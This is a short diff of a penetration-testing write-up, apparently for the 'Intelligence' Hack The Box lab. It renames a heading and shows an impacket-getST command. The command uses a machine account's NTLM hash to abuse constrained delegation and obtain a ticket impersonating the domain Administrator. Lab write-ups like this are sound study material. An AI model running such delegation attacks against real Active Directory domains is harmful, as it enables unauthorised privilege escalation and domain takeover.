@@ -526,7 +526,7 @@ This user is compromised
 ## Bloodhound on `svc_int$`
 ![](Pasted%20image%2020260414172248.png)
 
-# Domain admin
+# Domain admin via constrained delegation
 ```python
 faketime -f +7h impacket-getST intelligence.htb/svc_int$ -hashes ':3c356107d6b589fdfc215e2c3de484b5' -spn 'WWW/dc.intelligence.htb' -impersonate Administrator
 Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
